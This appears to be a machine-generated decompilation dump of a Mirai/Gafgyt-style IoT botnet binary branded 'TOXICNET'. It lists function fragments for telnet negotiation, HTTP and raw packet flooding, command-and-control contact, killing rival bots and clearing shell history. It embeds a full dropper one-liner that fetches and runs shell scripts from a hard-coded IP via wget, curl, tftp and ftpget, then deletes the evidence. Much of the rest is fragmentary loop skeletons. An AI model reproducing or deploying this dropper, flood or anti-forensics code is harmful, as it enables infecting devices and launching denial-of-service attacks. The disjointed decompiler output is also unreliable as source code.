                                        if (fgets(v170, v174, v175) != 0) {
                                            __GI_fclose((char *)v175);
                            v182 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v170, v174, v175) != 0) {
                                        __GI_fclose((char *)v175);
    while (true) {
        if (fgets(v170, v174, v175) == 0) {
                __GI_fclose((char *)v175);
                while (true) {
                        while (true) {
                                    while (true) {
                            while (true) {
                                if (__GI_strcasecmp(v189, v214) == 0) {
                                if (inet_pton(2, (char *)v216, v173) > 0) {
                                        __GI_fclose((char *)v175);
                                    if (inet_pton(10, (char *)v217, v183) > 0) {
                                            __GI_fclose((char *)v175);
                        while (true) {
                            if (fgets(v218, v219, v175) != 0) {
                                int32_t v221 = __GI_fclose((char *)v175); // 0x1ab84
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 32518
++++++++ FUNCTION END 33493
++++++++ FUNCTION LENGTH 975
        while (true) {
                while (true) {
                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                            while (true) {
                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                    while (true) {
                                        while (true) {
                                            while (true) {
    while (true) {
=================FUNCTION : _init ===================
++++++++ FUNCTION START 368
++++++++ FUNCTION END 714
++++++++ FUNCTION LENGTH 346
        "etrbhhgetrb",
        "close",
        "accept"
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5"
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
    char (*v92)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "telnet",
        "telnet"
        "telnet"
        "/dev/netslink/",
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 18419
++++++++ FUNCTION END 18728
++++++++ FUNCTION LENGTH 309
    int32_t v165 = socket(); // 0x11a48
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v165, (struct sockaddr *)&v166, 16) == -1) {
    int32_t v169 = __GI_getsockname(v165, (struct sockaddr *)&v168, (int32_t)&v167, (int32_t)&v168, 16); // 0x11b28
        int32_t v170 = __libc_open("/proc/net/route", 0); // 0x11b64
        while (true) {
            if (fdgets(v172, 0x1000, v170, v172) != 0) {
                if (strstr(v172, "\t00000000\t") != 0) {
                        __libc_close(v170);
                            __libc_close(v165);
                        __libc_close(v165);
                    __libc_close(v170);
                        __libc_close(v165);
                    __libc_close(v165);
            __libc_close(v170);
                __libc_close(v165);
            __libc_close(v165);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 65645
++++++++ FUNCTION END 66078
++++++++ FUNCTION LENGTH 433
    int32_t v166 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v165); // 0x195c4
        int32_t v169 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v165); // 0x195d8
    if (fgets(v163, 128, v168) == 0) {
        __GI_fclose((char *)v167);
    while (true) {
            while (true) {
                        while (true) {
                                        while (true) {
                                            while (true) {
                                while (true) {
                                    if (fgets(v163, 128, v167) == 0) {
                                free();
                                    free();
                                while (true) {
                if (fgets(v163, 128, v167) == 0) {
            if (fgets(v163, 128, v167) == 0) {
    __GI_fclose((char *)v167);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 28242
++++++++ FUNCTION END 29278
++++++++ FUNCTION LENGTH 1036
                if (__libc_open((char *)v167, v172) < 0) {
                        free();
                            free();
                    free();
                if (__libc_open((char *)v167, v172) < 0) {
                        free();
                            free();
                    free();
                    free();
        if (__libc_open((char *)v167, v172) < 0) {
                free();
            free();
                free();
=================FUNCTION : print ===================
++++++++ FUNCTION START 3249
++++++++ FUNCTION END 3703
++++++++ FUNCTION LENGTH 454
    while (true) {
                    printchar(a1, (int32_t)*v168);
                        while (true) {
                            while (true) {
                                int32_t v191 = prints(v165, v188, v179, v173, (int32_t)&v190); // 0x8a5c
                                    int32_t v193 = printi(v165, v192, 10, 1, v179, v173, 97) + result; // 0x8acc
                                        int32_t v195 = printi(v165, v194, 16, 0, v179, v173, 97) + result; // 0x8b30
                                            int32_t v197 = printi(v165, v196, 16, 0, v179, v173, 65) + result; // 0x8b94
                                                int32_t v200 = printi(v165, v199, 10, 0, v179, v173, 97) + result; // 0x8bf8
                                                    int32_t v203 = prints(v165, (char *)&v167, v179, v173, v201); // 0x8c4c
            printchar(a1, (int32_t)*v168);
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 50620
++++++++ FUNCTION END 51025
++++++++ FUNCTION LENGTH 405
        v175 = getuid();
        v176 = geteuid();
            v178 = getgid(v176);
            if (v178 == getegid()) {
    while (true) {
    v175 = getuid();
    v176 = geteuid();
        v178 = getgid(v176);
        if (v178 == getegid()) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 70265
++++++++ FUNCTION END 70769
++++++++ FUNCTION LENGTH 504
        return inet_ntop4(a2, a3, a4);
        while (true) {
                while (true) {
                            while (true) {
                                                    if (inet_ntop4(a2 + 12, v193, v166 - v193 - 32) == 0) {
                                            v199 = sprintf(v193, (int32_t)"%x", v197, v198, (int32_t)&v200, (int32_t)&v200);
                                        if (inet_ntop4(a2 + 12, v193, v166 - v193 - 32) == 0) {
                                v199 = sprintf(v193, (int32_t)"%x", v197, v198, (int32_t)&v200, (int32_t)&v200);
                while (true) {
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5905
++++++++ FUNCTION END 6139
++++++++ FUNCTION LENGTH 234
    int32_t v165 = __libc_open("/proc/cpuinfo", 0); // 0x9608
    while (true) {
        if (fdgets(v167, 0x1000, v165, v167) == 0) {
            __libc_close(v165);
        uppercase((char *)&v166);
        if (strstr(v167, "BOGOMIPS") == v167) {
            while (true) {
                            while (true) {
                                        __libc_close(v165);
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 14301
++++++++ FUNCTION END 14516
++++++++ FUNCTION LENGTH 215
    random();
    random();
    int32_t result = sprintf(v166, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v167, v168); // 0x104c4
    while (true) {
        if (__libc_fork() != 0) {
    while (true) {
        v170 = socket_connect(a1, a3, (int32_t)a3);
    __libc_close(v170);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 2967
++++++++ FUNCTION END 3246
++++++++ FUNCTION LENGTH 279
        result2 = prints(a1, (char *)&v165, a5, a6, 0);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v169, a5 - 1, a6, (int32_t)&v172);
            result = prints(a1, v170, a5, a6, (int32_t)&v172);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v169, a5 - 1, a6, (int32_t)&v172);
        result2 = prints(a1, v170, a5, a6, (int32_t)&v172);
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 23547
++++++++ FUNCTION END 23882
++++++++ FUNCTION LENGTH 335
            int32_t v168 = __GI_getpagesize(); // 0x12ee8
                v167 = getcwd(v166, v169);
                    free();
        v167 = getcwd(a1, a2);
            free();
        v167 = getcwd(v166, a2);
            free();
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 44146
++++++++ FUNCTION END 44486
++++++++ FUNCTION LENGTH 340
        free();
                __heap_free((int32_t *)&v165, v175 + v169, v168 - v175);
                free();
                __heap_free((int32_t *)&v165, v175 + v169, v168 - v175);
                free();
            __heap_free((int32_t *)&v165, v175 + v169, v168 - v175);
            free();
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 8831
++++++++ FUNCTION END 9071
++++++++ FUNCTION LENGTH 240
        __libc_send(a1, (int32_t *)&v167, 1, 0x4000);
                __libc_send(a1, (int32_t *)&v167, 1, 0x4000);
                __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
            __libc_send(a1, (int32_t *)&v167, 1, 0x4000);
            __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
        __libc_send(a1, (int32_t *)&v167, 1, 0x4000);
        __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12915
++++++++ FUNCTION END 13120
++++++++ FUNCTION LENGTH 205
    int32_t v165 = socket(); // 0xf29c
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v165, (int32_t *)v174, 65, 0);
            __libc_connect(v165, (struct sockaddr *)&v167, 16);
                __libc_close(v165);
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 45308
++++++++ FUNCTION END 45555
++++++++ FUNCTION LENGTH 247
        while (true) {
                                __heap_link_free_area_after();
                            __heap_link_free_area_after();
                    __heap_link_free_area();
            __heap_link_free_area();
    __heap_link_free_area();
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6517
++++++++ FUNCTION END 6804
++++++++ FUNCTION LENGTH 287
            while (true) {
                sockprintf(v172, (int32_t)"PING");
                while (true) {
                    if (__libc_recv(v172, (int32_t *)&v173, 1, 0, v176) != 1) {
        while (true) {
            if (__libc_recv(v172, (int32_t *)&v173, 1, 0, v176) == 1) {
=================FUNCTION : sendHTTP2 ===================
++++++++ FUNCTION START 14519
++++++++ FUNCTION END 14742
++++++++ FUNCTION LENGTH 223
    while (true) {
        random();
        sprintf(v167, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v169);
        if (__libc_fork() != 0) {
            while (true) {
                    if (socket_connect(a2, a3, (int32_t)a3) != 0) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 63370
++++++++ FUNCTION END 63680
++++++++ FUNCTION LENGTH 310
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 62866
++++++++ FUNCTION END 63196
++++++++ FUNCTION LENGTH 330
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4694
++++++++ FUNCTION END 4917
++++++++ FUNCTION LENGTH 223
    __libc_close(a1);
    __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v166, (int32_t)&v168);
    while (true) {
        v170 = __libc_waitpid(v171, (int32_t)&v169, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v168, 0);
    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v168, 0);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 6142
++++++++ FUNCTION END 6333
++++++++ FUNCTION LENGTH 191
    int32_t v167 = __libc_open("/proc/cpuinfo", 0); // 0x9840
    while (true) {
        if (fdgets(v166, 0x1000, v167, v166) == 0) {
            __libc_close(v167);
        uppercase((char *)&v165);
        if (strstr(v166, "BOGOMIPS") == v166) {
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 69662
++++++++ FUNCTION END 70041
++++++++ FUNCTION LENGTH 379
        return inet_pton4(a2, a3);
                    while (true) {
        while (true) {
                    if (inet_pton4((char *)v171, v169) >= 1) {
                                while (true) {
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 34289
++++++++ FUNCTION END 34605
++++++++ FUNCTION LENGTH 316
            while (true) {
        _stdio_openlist_dec_use(v167);
        while (true) {
    _stdio_openlist_dec_use(v172);
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 19684
++++++++ FUNCTION END 20209
++++++++ FUNCTION LENGTH 525
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 14745
++++++++ FUNCTION END 14927
++++++++ FUNCTION LENGTH 182
    inet_addr(a1);
        int32_t v167 = socket(); // 0x106f4
        __libc_connect(v167, (struct sockaddr *)&v166, 16);
        __libc_close(v167);
=================FUNCTION : __modsi3 ===================
++++++++ FUNCTION START 20950
++++++++ FUNCTION END 21580
++++++++ FUNCTION LENGTH 630
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 11970
++++++++ FUNCTION END 12170
++++++++ FUNCTION LENGTH 200
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v170 = socket(); // 0xde0c
    __GI_setsockopt(v170, 6, 1, &v165, 4);
    if (__libc_connect(v170, (struct sockaddr *)&v169, 16) == -1) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 30644
++++++++ FUNCTION END 31570
++++++++ FUNCTION LENGTH 926
    while (true) {
        while (true) {
                while (true) {
                                                        while (true) {
=================FUNCTION : __aeabi_idiv ===================
++++++++ FUNCTION START 73612
++++++++ FUNCTION END 74193
++++++++ FUNCTION LENGTH 581
        while (true) {
                                    while (true) {
                                        while (true) {
                    while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 9313
++++++++ FUNCTION END 9573
++++++++ FUNCTION LENGTH 260
    while (true) {
        int32_t v171 = __libc_recv(a1, (int32_t *)v170, 1, 0, v170); // 0xa904
                    if (strstr(a6, (char *)a2) == 0) {
                int32_t v172 = __libc_recv(a1, (int32_t *)(v170 + 1), 2, 0, v168); // 0xa96c
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 37415
++++++++ FUNCTION END 37730
++++++++ FUNCTION LENGTH 315
    while (true) {
    while (true) {
                while (true) {
                    while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 48251
++++++++ FUNCTION END 48919
++++++++ FUNCTION LENGTH 668
                while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : __umodsi3 ===================
++++++++ FUNCTION START 20382
++++++++ FUNCTION END 20947
++++++++ FUNCTION LENGTH 565
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 49294
++++++++ FUNCTION END 49559
++++++++ FUNCTION LENGTH 265
            if (__GI_sigprocmask(v166, (struct _TYPEDEF_sigset_t *)&v169, v168) == v166) {
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v167, 0);
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v167, 0);
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v167, 0);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 53957
++++++++ FUNCTION END 54313
++++++++ FUNCTION LENGTH 356
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 13939
++++++++ FUNCTION END 14126
++++++++ FUNCTION LENGTH 187
    while (true) {
            __libc_system(v165);
            __libc_system(v165);
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 14129
++++++++ FUNCTION END 14298
++++++++ FUNCTION LENGTH 169
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 18216
++++++++ FUNCTION END 18416
++++++++ FUNCTION LENGTH 200
        __libc_close(v166);
    int32_t v173 = socket(); // 0x119a8
    return connectTimeout(v173, v164, v171, 30) == 0;
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 31979
++++++++ FUNCTION END 32322
++++++++ FUNCTION LENGTH 343
            while (true) {
                                    case 256: {
                                    case 512: {
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 8631
++++++++ FUNCTION END 8828
++++++++ FUNCTION LENGTH 197
    int32_t result = __libc_fork(); // 0xa34c
    while (true) {
                free();
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 8408
++++++++ FUNCTION END 8628
++++++++ FUNCTION LENGTH 220
    if (getHost(a2, &v166) != 0) {
    if (__libc_connect(a1, (struct sockaddr *)&v165, 16) >= 0) {
    getsockopt();
=================FUNCTION : trim ===================
++++++++ FUNCTION START 1960
++++++++ FUNCTION END 2187
++++++++ FUNCTION LENGTH 227
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 36780
++++++++ FUNCTION END 37053
++++++++ FUNCTION LENGTH 273
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 37056
++++++++ FUNCTION END 37412
++++++++ FUNCTION LENGTH 356
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 4045
++++++++ FUNCTION END 4220
++++++++ FUNCTION LENGTH 175
    print(&v166, a2, (int32_t)&v167);
    int32_t result = __libc_send(a1, (int32_t *)v165, strlen(str), 0x4000); // 0x8df8
    free();
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 71674
++++++++ FUNCTION END 71847
++++++++ FUNCTION LENGTH 173
    int32_t result = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v164); // 0x1a850
        return __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v164);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 38421
++++++++ FUNCTION END 38643
++++++++ FUNCTION LENGTH 222
    while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 8212
++++++++ FUNCTION END 8405
++++++++ FUNCTION LENGTH 193
    while (true) {
            if (strcasestr((char *)a1, v168, 4 * v167) != 0) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 9074
++++++++ FUNCTION END 9310
++++++++ FUNCTION LENGTH 236
    while (true) {
                while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 47052
++++++++ FUNCTION END 47270
++++++++ FUNCTION LENGTH 218
            while (true) {
                    __GI_random_r((int32_t *)(int32_t)a1, (int32_t)&v173);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 69027
++++++++ FUNCTION END 69238
++++++++ FUNCTION LENGTH 211
    while (true) {
        while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 36336
++++++++ FUNCTION END 36594
++++++++ FUNCTION LENGTH 258
    while (true) {
            while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 34608
++++++++ FUNCTION END 34894
++++++++ FUNCTION LENGTH 286
            while (true) {
                if ((char)getc_unlocked((char *)a3) == -1) {
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 26232
++++++++ FUNCTION END 26440
++++++++ FUNCTION LENGTH 208
        v165 = sigprocmask(how, set, oset);
    v165 = sigprocmask(how, set, oset);
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 54316
++++++++ FUNCTION END 54569
++++++++ FUNCTION LENGTH 253
    while (true) {
            while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 63877
++++++++ FUNCTION END 64086
++++++++ FUNCTION LENGTH 209
    while (true) {
        while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 66251
++++++++ FUNCTION END 66419
++++++++ FUNCTION LENGTH 168
    __libc_getpid();
    return kill();
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 22104
++++++++ FUNCTION END 22284
++++++++ FUNCTION LENGTH 180
    int32_t result = vfork(); // 0x12cf0
        int32_t result2 = fork(); // 0x12d08
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 47697
++++++++ FUNCTION END 47908
++++++++ FUNCTION LENGTH 211
    int32_t v168 = __vfork(); // 0x16a14
        int32_t v169 = wait4(); // 0x16abc
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 37904
++++++++ FUNCTION END 38203
++++++++ FUNCTION LENGTH 299
            while (true) {
                while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 55545
++++++++ FUNCTION END 55833
++++++++ FUNCTION LENGTH 288
            while (true) {
    while (true) {
=================FUNCTION : __aeabi_ddiv ===================
++++++++ FUNCTION START 78525
++++++++ FUNCTION END 79202
++++++++ FUNCTION LENGTH 677
            while (true) {
                while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 64089
++++++++ FUNCTION END 64351
++++++++ FUNCTION LENGTH 262
    while (true) {
        while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 73139
++++++++ FUNCTION END 73410
++++++++ FUNCTION LENGTH 271
        while (true) {
            while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 47459
++++++++ FUNCTION END 47694
++++++++ FUNCTION LENGTH 235
        srandom_r((int32_t *)v165, a3);
    srandom_r((int32_t *)v165, a3);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 27493
++++++++ FUNCTION END 27705
++++++++ FUNCTION LENGTH 212
    if (__libc_close(v165) < 0) {
    _stdio_openlist_dec_use(__pthread_return_void());
=================FUNCTION : __GI_memset ===================
++++++++ FUNCTION START 35655
++++++++ FUNCTION END 35948
++++++++ FUNCTION LENGTH 293
        while (true) {
        while (true) {
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 53237
++++++++ FUNCTION END 53414
++++++++ FUNCTION LENGTH 177
    int32_t v165 = wait4(); // 0x175b8
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 23367
++++++++ FUNCTION END 23544
++++++++ FUNCTION LENGTH 177
    int32_t v165 = fork(); // 0x12e94
=================FUNCTION : csum ===================
++++++++ FUNCTION START 11168
++++++++ FUNCTION END 11442
++++++++ FUNCTION LENGTH 274
    while (true) {
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 40235
++++++++ FUNCTION END 40410
++++++++ FUNCTION LENGTH 175
    if (inet_aton((char *)v165, (int32_t)&result) != 0) {
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 24961
++++++++ FUNCTION END 25143
++++++++ FUNCTION LENGTH 182
    int32_t fd = open(path, oflag); // 0x130d0
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3706
++++++++ FUNCTION END 3873
++++++++ FUNCTION LENGTH 167
    return print(NULL, a1, (int32_t)&v165);
=================FUNCTION : random ===================
++++++++ FUNCTION START 45966
++++++++ FUNCTION END 46138
++++++++ FUNCTION LENGTH 172
    __GI_random_r((int32_t *)0x274c8, (int32_t)&result);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 41487
++++++++ FUNCTION END 41664
++++++++ FUNCTION LENGTH 177
    int32_t v165 = getsockopt(); // 0x15b60
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 50256
++++++++ FUNCTION END 50440
++++++++ FUNCTION LENGTH 184
    int32_t result2 = __libc_open("/dev/null", (int32_t)a2); // 0x17064
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 25146
++++++++ FUNCTION END 25323
++++++++ FUNCTION LENGTH 177
    int32_t v166 = __libc_open((char *)v165, 577); // 0x1310c
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 10997
++++++++ FUNCTION END 11165
++++++++ FUNCTION LENGTH 168
    return rand_cmwc() & -1 - a1 ^ v165 & a1;
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 11793
++++++++ FUNCTION END 11967
++++++++ FUNCTION LENGTH 174
        __libc_close(a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 46489
++++++++ FUNCTION END 46659
++++++++ FUNCTION LENGTH 170
    srandom_r((int32_t *)a1, (int32_t)&v164);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 41127
++++++++ FUNCTION END 41304
++++++++ FUNCTION LENGTH 177
    int32_t v165 = connect(sock, addr, addr_len); // 0x15b04
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 40413
++++++++ FUNCTION END 40583
++++++++ FUNCTION LENGTH 170
    gethostbyname_r(a1, &v166, (int32_t)&v165, 460, v164, v163);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 43649
++++++++ FUNCTION END 43909
++++++++ FUNCTION LENGTH 260
    __heap_free((int32_t *)&v165, 0x1000000 * v170 / 0x1000000, v168);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 39863
++++++++ FUNCTION END 40054
++++++++ FUNCTION LENGTH 191
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 41847
++++++++ FUNCTION END 42024
++++++++ FUNCTION LENGTH 177
    int32_t v165 = send(sock, buf, length, flags); // 0x15bb8
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 26623
++++++++ FUNCTION END 26790
++++++++ FUNCTION LENGTH 167
    return wait4();
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 28048
++++++++ FUNCTION END 28239
++++++++ FUNCTION LENGTH 191
    int32_t result = _vfprintf_internal(v166, (char *)v173, v174, v172, v167, v172, v167, v167, v167, v172, v170); // 0x13540
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 23007
++++++++ FUNCTION END 23184
++++++++ FUNCTION LENGTH 177
    int32_t v165 = close(fd); // 0x12e3c
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 31573
++++++++ FUNCTION END 31800
++++++++ FUNCTION LENGTH 227
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4920
++++++++ FUNCTION END 5112
++++++++ FUNCTION LENGTH 192
    while (true) {
=================FUNCTION : getBuild ===================
++++++++ FUNCTION START 18731
++++++++ FUNCTION END 18898
++++++++ FUNCTION LENGTH 167
    return (int32_t)"TOXICNET";
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 7349
++++++++ FUNCTION END 7523
++++++++ FUNCTION LENGTH 174
        __libc_close(*a1);
=================FUNCTION : socket ===================
++++++++ FUNCTION START 42387
++++++++ FUNCTION END 42564
++++++++ FUNCTION LENGTH 177
    int32_t v165 = socket(); // 0x15c48
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 70044
++++++++ FUNCTION END 70262
++++++++ FUNCTION LENGTH 218
    while (true) {
=================FUNCTION : free ===================
++++++++ FUNCTION START 43912
++++++++ FUNCTION END 44143
++++++++ FUNCTION LENGTH 231
    v163 = __heap_free((int32_t *)&v168, v167 - 4, v169);
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 41307
++++++++ FUNCTION END 41484
++++++++ FUNCTION LENGTH 177
    int32_t v165 = getsockname(sock, addr, (int32_t *)addr_len); // 0x15b30
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 27708
++++++++ FUNCTION END 27875
++++++++ FUNCTION LENGTH 167
    return _stdio_fopen();
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 68555
++++++++ FUNCTION END 68769
++++++++ FUNCTION LENGTH 214
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 45558
++++++++ FUNCTION END 45793
++++++++ FUNCTION LENGTH 235
    while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 23885
++++++++ FUNCTION END 24059
++++++++ FUNCTION LENGTH 174
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : kill ===================
++++++++ FUNCTION START 24781
++++++++ FUNCTION END 24958
++++++++ FUNCTION LENGTH 177
    int32_t v165 = kill(); // 0x13080
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 44489
++++++++ FUNCTION END 44716
++++++++ FUNCTION LENGTH 227
    while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 38206
++++++++ FUNCTION END 38418
++++++++ FUNCTION LENGTH 212
    while (true) {
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 6807
++++++++ FUNCTION END 6975
++++++++ FUNCTION LENGTH 168
    return __GI_inet_ntoa((int32_t *)v165);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 24239
++++++++ FUNCTION END 24416
++++++++ FUNCTION LENGTH 177
    int32_t pid = getpid(); // 0x12fd8
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5544
++++++++ FUNCTION END 5712
++++++++ FUNCTION LENGTH 168
    int32_t v165 = inet_addr(a1); // 0x9540
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 42207
++++++++ FUNCTION END 42384
++++++++ FUNCTION LENGTH 177
    int32_t v165 = setsockopt(sock, level, option_name, option_value, 0); // 0x15c1c
=================FUNCTION : rand ===================
++++++++ FUNCTION START 45796
++++++++ FUNCTION END 45963
++++++++ FUNCTION LENGTH 167
    return random();
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 40057
++++++++ FUNCTION END 40232
++++++++ FUNCTION LENGTH 175
    int32_t result = __GI_inet_ntoa_r(); // 0x1571c
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 11621
++++++++ FUNCTION END 11790
++++++++ FUNCTION LENGTH 169
    return rand_cmwc();
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 42027
++++++++ FUNCTION END 42204
++++++++ FUNCTION LENGTH 177
    int32_t v165 = sendto(sock, message, length, flags, NULL, 0); // 0x15bec
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 69413
++++++++ FUNCTION END 69659
++++++++ FUNCTION LENGTH 246
    while (true) {
